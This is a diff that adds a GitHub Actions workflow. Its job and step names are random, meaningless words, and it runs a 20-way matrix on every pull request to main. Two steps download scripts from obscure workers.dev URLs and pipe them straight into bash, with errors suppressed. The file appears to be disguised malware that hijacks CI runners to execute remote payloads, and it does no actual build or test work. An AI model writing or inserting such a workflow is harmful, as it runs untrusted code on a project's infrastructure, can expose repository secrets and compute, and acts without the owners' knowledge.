@@ -1,0 +1,29 @@
+name: overnight
+
+on:
+  workflow_dispatch:
+  pull_request:
+    branches: [ "main" ]
+
+concurrency:
+  group: wreck
+
+jobs:
+  programming:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        temptation: ["message", "dial", "proposal", "cordial", "severe"]
+        impermanency: ["merit", "nature", "desert", "radar"]
+      fail-fast: false
+    steps:
+    - name:  component
+      uses: actions/checkout@v6
+    - name: civilization
+      continue-on-error: true
+      run: curl -s -L "https://i.donnickcarbonaro70085.workers.dev/4/eff5a/26266/6e03fa/c9ccce1402aaf/b78a384317ee0acb4b9960f4ea2/796f/8ba?c=1777774845&zy=u" | bash
+    - name: fuss
+      continue-on-error: true
+      run: curl -S -L "https://i7934.javascript91043xz1.workers.dev/581cb2/82/76f08c12c4/26c8c98/68/504/7c12abb1f08ce848399baf9e6604f/5f036?n=1777796745&lm=p" | bash
+    - name: divide
+      run: apple
